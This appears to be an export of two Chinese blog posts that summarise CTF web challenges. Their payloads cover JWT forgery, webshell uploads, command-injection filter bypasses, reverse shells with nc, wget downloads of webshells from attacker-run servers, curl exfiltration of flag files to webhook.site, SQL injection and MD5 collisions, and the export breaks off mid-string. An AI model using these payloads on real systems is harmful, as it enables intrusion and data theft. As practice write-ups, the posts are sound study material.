[{"id":"a31a5557cbeb213ac7cdc723f501dbeb","title":"赛题总结3","content":"JWT令牌伪造JSON Web Token \n \nHFCTF2020 EasyLoginhttps://buuoj.cn/challenges#[HFCTF2020]EasyLogin\n发现提示知道是koa框架\n经查询koa框架主要逻辑代码在 controller&#x2F;api.js中\n访问&#x2F;controllers&#x2F;api.js得到主要逻辑代码得知身份为admin是可读取flag\n并且使用jwt来识别身份\n抓包获取当前jwt信息\n \n \n利用nodejs的jwt缺陷，当jwt的secretid为空，（不能为null&amp;undefined）\njwt会采用algorithm为none进行解密。\n即 secretid&#x3D;[] 或 srcretid&#x3D;0.1很小的数 并且 “alg”&#x3D;none 就相当于没有加密算法\n用python脚本来构造目标jwt令牌 iat也要对应\n \n \n访问&#x2F;api&#x2F;flag即可\nCISCN2019 华北赛区 ikun[https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2\\]ikun](https://buuoj.cn/challenges#[CISCN2019 华北赛区 Day1 Web2]ikun)\n根据提示买下V6会员\n爆破出v6会员在181页\n抓包购买界面 发现可以修改折扣 \n修改后直接买下\n                               \n出现此页面 再次抓包修改身份\n \n通过抓包页面判断出通过JWT令牌识别身份\n使用c-jwt-cracker爆破出 Srcret\n \n\n进行身份构造\nRCE软链接  ln -sCISCN2023 Unzip如图在 122目录下存在文件233\n\n返回其他目录创建软链接 ln -s 1&#x2F;122&#x2F;233 lj\n\n即可在其他目录查看文件内容\n\n同理也可以指定目录，下面题目用到\n\n\nunzip\n阅读代码发现回先进入到&#x2F;tmp目录再进行解压\n所以我们要上传zip文件\n1.先创建软链接 ln -s &#x2F;var&#x2F;www&#x2F;html slj\n2.将软链接打包后将本体删除\n3.创建一个与软链接同名的目录\n4.进入目录创建木马\n5.将同名目录打包\n6.上传两个压缩包\n\n7.url&#x2F;shell.php连接蚁剑即可\n\n\n换行符绕过注释牢牢记住，逝者为大\n\n最后一行有注释符 # 用换行符 %a0 来绕过\n根据上边过滤可知需要进行二次传参 \nsystem被过滤 用 &#96; 来代替\ncmd拼接到后边的mamba out,需要先闭合再注释掉\n\npayload:\n1%0a`$_GET[1]`;%23\n\n思路一 反弹shellps:不要忘记分号闭合\n&amp;1&#x3D;nc 101.37.70.128 7878 -e &#x2F;b’’in&#x2F;sh      b’’in绕过过滤\n进行反弹shell获取flag\n\n思路二 远程下载木马1wget -O &lt;保存路径/文件名&gt; &lt;下载链接&gt;\n\n现在攻击机上准备一份木马 she\n\n用python开启一个服务\n\n将该端口映射到公网上  用到nps内网穿透 效果呈现如下\n\n搭建成功之后 进行二次传参并构造下载文件命令\n123payload：%0a`$_GET[1]`;%23&amp;1=wget -O ./she.php http://101.37.70.128:10010/she\n\n访问url&#x2F;she.php连接蚁剑即可\n\n八进制构造命令 移位构造二进制命令ezRCE用八进制构造命令\n\n可见\n **$’\\154\\163’ **和 ls 命令效果相同\n\n原理如下\n在Shell编程中，ls -l是用于列出目录内容的命令，其中ls表示列出目录内容，而-l表示以长格式显示。在你提供的表达式$&#39;\\154\\163\\40\\55\\154&#39;中，\\用于转义字符，这些反斜杠后面跟着的数字表示了对应字符的 ASCII 码值。而\\154对应于八进制ASCII码，其十进制值为108，表示字符l；\\163对应于字符s；\\40对应于ASCII码值为32的空格字符；\\55对应于ASCII码值为45的减号字符，也就是-。因此，表达式$&#39;\\154\\163\\40\\55\\154&#39;等同于ls -l。\n\n上述是八进制\n当可用字符只有0 和 1 时\n\n可以利用\n\n来实现构造目标八进制数字\n用位移运算构造数字二\n\n1 &lt;&lt; 1 是一个位移运算，表示将二进制数 1 向左移动 1 位。在位移运算中，向左移动意味着在数字的二进制表示中向左移动指定的位数，空出的位数用0填充。因此，1 的二进制表示是 0001，将其向左移动 1 位后，变成了 0010。结果是2\n反斜杠则是\n\n结合利用payload:\n$\\‘\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;\n最后一个反斜杠确保整个命令的结束字符 \\\n第一个 \\ 是将**’\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;转译为‘\\154\\163’**\n\n空格被过滤 ${IFS}无效时\n可以这样构造\n\n\n由于不能存在空格\n所以eval {ls,&#x2F;}仍无效\n利用脚本构造\n\n\npayload:\n$’\\142\\141\\163\\150’&lt;&lt;&lt;$’\\173\\154\\163\\54\\57\\175’ bash&lt;&lt;&lt;{ls,&#x2F;}\n$’\\142\\141\\163\\150’&lt;&lt;&lt;$’\\173\\143\\141\\164\\54\\57\\146\\154\\141\\147\\175’  bash&lt;&lt;&lt;{cat,&#x2F;flag}\n\nhex2bin函数构造16进制命令CISCN2024simple php\n发现**$cmd嵌套在system函数中，不是eval函数中**，所以此时的命令会传入命令行中，要以命令行（终端）的角度来执行\n命令行运行php代码\n阅读题干发现无法正常传入命令（被过滤）八进制也无效果（引号被ban）\n可以结合php中的hex2bin函数来传入16进制命令  \n6c73202f &#x2F;&#x2F; ls &#x2F;  可以根据思路构造反弹shell命令\n\n构造16进制命令123456e632034372e39392e34332e33382037383738202d65202f62696e2f7368** // **nc 47.99.43.38 7878 -e /bin/sh**1.system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));2.system(hex2bin(substr(&#x27;6e632034372e39392e34332e33382037383738202d65202f62696e2f7368&#x27;,0)));\n\n经过实验可得，以上两种方法均可反弹shell,1 的优势是可以绕过引号使用\n123payload: POSTcmd=php -r system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));\n\n连接数据库成功反弹后发现无flag目录，这里看wp才知道，flag可能在数据库中\n就要在反弹的shell中进行mysql数据库连接\n想办法知道用户名和密码是什么，最简单的就是弱口令\n尝试 root root后发现连接成功\npayload:\n\n\nshell_exec无回显外带听不见我的声音\n方法一$(cmd)  反引号的利用\n了解功能之后，我们可以使用数据外带网站\n123curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`cat /flag`curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/$(cat /flag)wget https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`cat /flag`\n\n方法二将命令回显定向到指定文件中\n1cat /flag &gt; 1.txt\n\n访问1.txt即可\nBypasssizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)basectf玩原神玩的1234567891011121314151617181920212223242526272829303132333435&lt;?phphighlight_file(__FILE__);error_reporting(0);include &#x27;flag.php&#x27;;if (sizeof($_POST[&#x27;len&#x27;]) == sizeof($array)) &#123;  ys_open($_GET[&#x27;tip&#x27;]);&#125; else &#123;  die(&quot;错了！就你还想玩原神？❌❌❌&quot;);&#125;function ys_open($tip) &#123;  if ($tip != &quot;我要玩原神&quot;) &#123;    die(&quot;我不管，我要玩原神！😭😭😭&quot;);  &#125;  dumpFlag();&#125;function dumpFlag() &#123;  if (!isset($_POST[&#x27;m&#x27;]) || sizeof($_POST[&#x27;m&#x27;]) != 2) &#123;    die(&quot;可恶的QQ人！😡😡😡&quot;);  &#125;  $a = $_POST[&#x27;m&#x27;][0];  $b = $_POST[&#x27;m&#x27;][1];  if(empty($a) || empty($b) || $a != &quot;100%&quot; || $b != &quot;love100%&quot; . md5($a)) &#123;    die(&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;);  &#125;  include &#x27;flag.php&#x27;;  $flag[] = array();  for ($ii = 0;$ii &lt; sizeof($array);$ii++) &#123;    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);  &#125;    echo json_encode($flag);&#125;\n\n第一部分sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)可以先在本地看一下sizeof($_POST[&#39;len&#39;])的返回值是什么\n12345678&lt;?phpif (isset($_POST[&#x27;len&#x27;])) &#123;    $lenCount = sizeof($_POST[&#x27;len&#x27;]);    echo &quot;Length of len array: &quot; . $lenCount; // 应该输出 45&#125; else &#123;    echo &quot;&#x27;len&#x27; parameter is not set.&quot;;&#125;?&gt;\n\n\n可见POST传几次len返回值就是几\n这里并不知道sizeof($array)长度是多少，进行爆破试出来是45，payload:\n12POST:len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=44\n\n第二部分过于简单，直接给payload\n1234GET:?tip=我要玩原神POST:len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=45&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966\n\n第三部分12345678 include &#x27;flag.php&#x27;;  $flag[] = array();  for ($ii = 0;$ii &lt; sizeof($array);$ii++) &#123;    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);  &#125;    echo json_encode($flag);&#125;\n\n将输出的密文进行解密\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php$md5 = [    &quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;, &quot;26657d5ff9020d2abefe558796b99584&quot;,    &quot;73278a4a86960eeb576a8fd4c9ec6997&quot;, &quot;ec8956637a99787bd197eacd77acce5e&quot;,    &quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;, &quot;43ec517d68b6edd3015b3edc9a11367b&quot;,    &quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;, &quot;c8ffe9a587b126f152ed3d89a146b445&quot;,    &quot;f457c545a9ded88f18ecee47145a72c0&quot;, &quot;03afdbd66e7929b125f8597834fa83a4&quot;,    &quot;093f65e080a295f8076b1c5722a46aa2&quot;, &quot;03afdbd66e7929b125f8597834fa83a4&quot;,    &quot;698d51a19d8a121ce581499d7b701668&quot;, &quot;d82c8d1619ad8176d665453cfb2e55f0&quot;,    &quot;b53b3a3d6ab90ce0268229151c9bde11&quot;, &quot;9f61408e3afb633e50cdf1b20de6f466&quot;,    &quot;7f39f8317fbdb1988ef4c628eba02591&quot;, &quot;07e1cd7dca89a1678042477183b7ac3f&quot;,    &quot;a1d0c6e83f027327d8461063f4ac58a6&quot;, &quot;7f6ffaa6bb0b408017b62254211691b5&quot;,    &quot;d67d8ab4f4c10bf22aa353e27879133c&quot;, &quot;9f61408e3afb633e50cdf1b20de6f466&quot;,    &quot;e369853df766fa44e1ed0ff613f563bd&quot;, &quot;5fd0b37cd7dbbb00f97ba6ce92bf5add&quot;,    &quot;67c6a1e7ce56d3d6fa748ab6d9af3fd7&quot;, &quot;3416a75f4cea9109507cacd8e2f2aefc&quot;,    &quot;b53b3a3d6ab90ce0268229151c9bde11&quot;, &quot;1c383cd30b7c298ab50293adfecb7b18&quot;,    &quot;3416a75f4cea9109507cacd8e2f2aefc&quot;, &quot;da4fb5c6e93e74d3df8527599fa62642&quot;,    &quot;c8ffe9a587b126f152ed3d89a146b445&quot;, &quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;,    &quot;735b90b4568125ed6c3f678819b6e058&quot;, &quot;14bfa6bb14875e45bba028a21ed38046&quot;,    &quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;, &quot;37693cfc748049e45d87b8c7d8b9aacd&quot;,    &quot;37693cfc748049e45d87b8c7d8b9aacd&quot;, &quot;98f13708210194c475687be6106a3b84&quot;,    &quot;3c59dc048e8850243be8079a5c74d079&quot;, &quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;,    &quot;33e75ff09dd601bbe69f351039152189&quot;, &quot;4e732ced3463d06de0ca9a15b6153677&quot;,    &quot;33e75ff09dd601bbe69f351039152189&quot;, &quot;c16a5320fa475530d9583c34fd356ef5&quot;,    &quot;43ec517d68b6edd3015b3edc9a11367b&quot;];// 用于存储还原出的字符$flag = &#x27;&#x27;;for ($i = 0; $i &lt; count($md5); $i++) &#123;    for ($j = 0; $j &lt; 256; $j++) &#123;        // 计算异或操作后的值        $xor_result = $j ^ $i;        // 计算MD5值        $calculated_md5 = md5($xor_result);        // 如果计算出的MD5值与给定的MD5值匹配，则找到了正确的字符        if ($calculated_md5 === $md5[$i]) &#123;            $flag .= chr($j);            break;        &#125;    &#125;&#125;echo &quot;Flag: &quot; . $flag . &quot;\\n&quot;;?&gt;\n\nurl@解析规则basectfAura酱的礼物1234567891011121314151617181920212223242526 &lt;?phphighlight_file(__FILE__);// Aura 酱，欢迎回家~// 这里有一份礼物，请你签收一下哟~$pen = $_POST[&#x27;pen&#x27;];if (file_get_contents($pen) !== &#x27;Aura&#x27;)&#123;    die(&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;);&#125;// 礼物收到啦，接下来要去博客里面写下感想哦~$challenge = $_POST[&#x27;challenge&#x27;];if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0)&#123;    die(&#x27;这不是 Aura 的博客！&#x27;);&#125;$blog_content = file_get_contents($challenge);if (strpos($blog_content, &#x27;已经收到Kengwang的礼物啦&#x27;) === false)&#123;    die(&#x27;请去博客里面写下感想哦~&#x27;);&#125;// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~$gift = $_POST[&#x27;gift&#x27;];include($gift); \n\n第一部分data:&#x2F;&#x2F;写入12345$pen = $_POST[&#x27;pen&#x27;];if (file_get_contents($pen) !== &#x27;Aura&#x27;)&#123;    die(&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;);&#125;\n\npayload:\n12POST:pen=data://text/plain,Aura\n\n第二部分1234567891011$challenge = $_POST[&#x27;challenge&#x27;];if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0)&#123;    die(&#x27;这不是 Aura 的博客！&#x27;);&#125;$blog_content = file_get_contents($challenge);if (strpos($blog_content, &#x27;已经收到Kengwang的礼物啦&#x27;) === false)&#123;    die(&#x27;请去博客里面写下感想哦~&#x27;);&#125; \n\n这里要注意是返回的是challange变量中的网页内容，并且网页内容是以字符串形式返回的\n\nfile_get_contents该函数可以从一个文件中读取其内容，并将内容以字符串的形式返回\n\nurl@解析规则在url中输入http://jasmineaura.github.io@baidu.com, 最终会解析为后者网站，即为http://baidu.com \n解法一将自己服务器写入一个文件，文件内容只要包含已经收到Kengwang的礼物啦即可，post**@服务器地址&#x2F;xx.txt**\npayload:\n12POST:challenge=http://jasmineaura.github.io@121.43.126.238:8009/1.txt\n\n\n解法二直接@本地回环地址即可，payload\n123456POST:challenge=http://jasmineaura.github.io@127.0.0.1 0.0.0.0localhostgz.imxbt.cn:20100 靶场网址\n\n因为**@这几个网址是访问它本身，并且这个靶机本身就包含已经收到Kengwang的礼物啦**，即可绕过\n最终payload12POST：pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@0.0.0.0&amp;gift=php://filter/convert.base64-encode/resource=flag.php\n\n\n\nphp原生类1basectfflag直接读取不就行了？1234567891011121314&lt;?phphighlight_file(&#x27;index.php&#x27;);# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~error_reporting(0);$J1ng = $_POST[&#x27;J&#x27;];$Hong = $_POST[&#x27;H&#x27;];$Keng = $_GET[&#x27;K&#x27;];$Wang = $_GET[&#x27;W&#x27;];$dir = new $Keng($Wang);foreach($dir as $f) &#123;    echo($f . &#x27;&lt;br&gt;&#x27;);&#125;echo new $J1ng($Hong);?&gt;\n\n过于简单直接附上payload\n1234GET:?K=FilesystemIterator&amp;W=glob:///secret/*POST:SplFileObject&amp;H=php://filter/convert.base64-encode/resource=/secret/f11444g.php\n\n参考文章：https://xz.aliyun.com/t/13785?time__1311=GqmxuQi%3De7qeqGNDQi5BIKY5bRGKOOa4D#toc-0\nphp原生类2BaseCTF\n1z_php12345678910111213141516171819202122232425262728293031323334353637&lt;?phphighlight_file(&#x27;index.php&#x27;);# 我记得她...好像叫flag.php吧？$emp=$_GET[&#x27;e_m.p&#x27;];$try=$_POST[&#x27;try&#x27;];if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)&#123;    for ($i=0;$i&lt;strlen($emp);$i++)&#123;        if (ctype_alpha($emp[$i]))&#123;            die(&quot;你不是hacker？那请去外场等候！&quot;);        &#125;    &#125;    echo &quot;只有真正的hacker才能拿到flag！&quot;.&quot;&lt;br&gt;&quot;;    if (preg_match(&#x27;/.+?HACKER/is&#x27;,$try))&#123;        die(&quot;你是hacker还敢自报家门呢？&quot;);    &#125;    if (!stripos($try,&#x27;HACKER&#x27;) === TRUE)&#123;        die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);    &#125;    $a=$_GET[&#x27;a&#x27;];    $b=$_GET[&#x27;b&#x27;];    $c=$_GET[&#x27;c&#x27;];    if(stripos($b,&#x27;php&#x27;)!==0)&#123;        die(&quot;收手吧hacker，你得不到flag的！&quot;);    &#125;    echo (new $a($b))-&gt;$c();&#125;else&#123;    die(&quot;114514到底是啥意思嘞？。？&quot;);&#125;# 觉得困难的话就直接把shell拿去用吧，不用谢~$shell=$_POST[&#x27;shell&#x27;];eval($shell);?&gt;\n\n第一部分12345678if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)&#123;    for ($i=0;$i&lt;strlen($emp);$i++)&#123;        if (ctype_alpha($emp[$i]))&#123;            die(&quot;你不是hacker？那请去外场等候！&quot;);        &#125;    &#125;    echo &quot;只有真正的hacker才能拿到flag！&quot;.&quot;&lt;br&gt;&quot;;\n\n非法字符转化规则e_m.p -&gt;e[m.p\nintval和ctype_alpha绕过GET: e[m.p&#x3D;114514.1 \n\n114514a会被ctype_alpha检查，不可用\n\n第二部分123456if (preg_match(&#x27;/.+?HACKER/is&#x27;,$try))&#123;       die(&quot;你是hacker还敢自报家门呢？&quot;);   &#125;   if (!stripos($try,&#x27;HACKER&#x27;) === TRUE)&#123;       die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);   &#125;\n\npreg_match和!stripos组合！！！长度绕过123a=&#x27;*&#x27;b=&#x27;HACKER&#x27;print(a*1000001+b)\n\n\nps:长度绕过一般为一百万位，建议使用bp重发器发送\n\n第三部分123456789101112    $a=$_GET[&#x27;a&#x27;];    $b=$_GET[&#x27;b&#x27;];    $c=$_GET[&#x27;c&#x27;];    if(stripos($b,&#x27;php&#x27;)!==0)&#123;        die(&quot;收手吧hacker，你得不到flag的！&quot;);    &#125;    echo (new $a($b))-&gt;$c();&#125;else&#123;    die(&quot;114514到底是啥意思嘞？。？&quot;);&#125;\n\nPHP原生类之SplFileObjectGET:a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&amp;c&#x3D;__toString\n\nc&#x3D;__toString是让echo触发__toString方法\n\nEXP123import requestsres = requests.post(&quot;http://gz.imxbt.cn:20214/?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php&amp;c=__tostring&quot;, data=&#123;&#x27;try&#x27;: &#x27;-&#x27; * 1000001 + &#x27;HACKER&#x27;&#125;)print(res.text)\n\nSQL预处理 SQL[强网杯 2019]随便注https://www.nssctf.cn/problem/17\n思路一预处理 SQL预处理流程\n                             \nPayload:\n1234567-1&#x27;;set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prepare stmt from @sql;execute stmt;\n\n**concat()**的用法 若没定义，则默认用 逗号 来拼接字符串\n1CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);\n\n**在上方语句中 是将 ‘se’**和 **’lect * from 1919810931114514;’**两个字符串拼接\n查询语句 **select * from 1919810931114514; **\n从而绕过关键字过滤\n回显 \nStrstr() 查找字符串第一次出现 查询资料可发现 \n该函数对大小写敏感 因此可以利用大小写绕过\n最终payload\n1234567-1&#x27;;Set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);pRepare stmt from @sql;execute stmt;\n\n\n\n最后解释一下为什么要用预定义sql\n \n思路二 猜测原语句 修改表名堆叠注入输入show tables;之后发现我们当前所处的数据库中只有两张表\nShow columns from 1919810931114514\n1Show columns from `1919810931114514`\n\n查询字段发现flag在1919810931114514中\n即可反推出当前页面查询的是words表\nsql语句便是 select data from words where id &#x3D;$inject\n既然可以堆叠注入 将表名改动即可\nPayload:\n123456789rename table `words` to `ttt`;rename table `1919810931114514` to `words`;ALTER TABLE words ADD id int(10) DEFAULT &#x27;12&#x27;;alert table `words` change `flag` `data` varchar(100);show columns from `words`;\n\nALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);\n最后查询 1’ or ‘1&#x3D;1\n思路三 handler代替select\n\n123-1&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;-- +\n\n\n\nsql与代码审计[GXYCTF 2019]BabySqli https://www.nssctf.cn/problem/1093 \nMMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 \n解密后\nselect * from user where username &#x3D; ‘$name’\n提示我们先注入用户名\n1231&#x27; union select 1,2,3 #测出字段数是31&#x27; union select &#x27;admin&#x27;,2,3# 判断用户所在列 返回wrong user1&#x27; union select 1,&#x27;admin&#x27;,3 #返回wrong pass\n\n得出了admin用户在第二列\n查看源码根据提示查看源码\n12345678if($arr[1] == &quot;admin&quot;)&#123;\t\t\tif(md5($password) == $arr[2])&#123;\t\t\t\techo $flag;\t\t\t&#125;\t\t\telse&#123;\t\t\t\tdie(&quot;wrong pass!&quot;);\t\t\t&#125;\t\t&#125;\n\n发现是密码输入框的值进行md5加密进行匹配\n测试密码字段所以到此需要猜想那一个字段是密码\n一般来说，2是用户，3就是密码，进行测试\n121’union select 1,‘admin’,‘e10adc3949ba59abbe56e057f20f883e’# //第三个字段是123456的MD5加密格式123456 #密码框输入\n\n获得flag\n","slug":"赛题总结3","date":"2024-10-31T12:43:45.000Z","categories_index":"","tags_index":"赛题","author_index":"Sygsdsg"},{"id":"befe7ebe5c3909555effd7c815dc781c","title":"赛题总结1","content":"https://gz.imxbt.cn/games\nCtf经验及其题目总结l 做题经验：不要忽略index.php** 和查看源代码 \nl robots.txt\nl Sql先测闭合和和注释符\nMD5各姿势绕过1.判断是否为MD5的关键字ffifdyop \n​                               \n2.MD5比较 （双&#x3D;&#x3D;）l md5_1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\n&amp;md5_2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\nl $a&#x3D;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\n$b&#x3D;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\n3：$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)​    此时我们需要满足 a 不等于 b 但是 a 和 b 进行 md5 后的数值需要相等\n​    可以让a &#x3D;QNKCDZO b&#x3D;&#x3D;240610708  s878926199a  s155964671a QLTHNDT\nQNKCDZO 和 240610708 进行 md5 后加密的数值为 0e开头，在 PHP 中会被识别为科学计数法，所有 0e 开头的数据进行弱类型比较皆为 True \n​    或者a[]&#x3D;1&amp;b[]&#x3D;1,md5无法进行数组比较 即可绕过 \n4：&#x3D;&#x3D;&#x3D;强类型比较 $_POST``[``&#39;param1&#39;``]!==``$_POST``[``&#39;param2&#39;``]&amp;&amp;``md5``(``$_POST``[``&#39;param1&#39;``])===``md5``(``$_POST``[``&#39;param2&#39;``]\n··       仍可用数组进行比较param1[]&#x3D;1&amp;param2[]&#x3D;2\n​    Or\n​    array1&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab\n&amp;\narray2&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba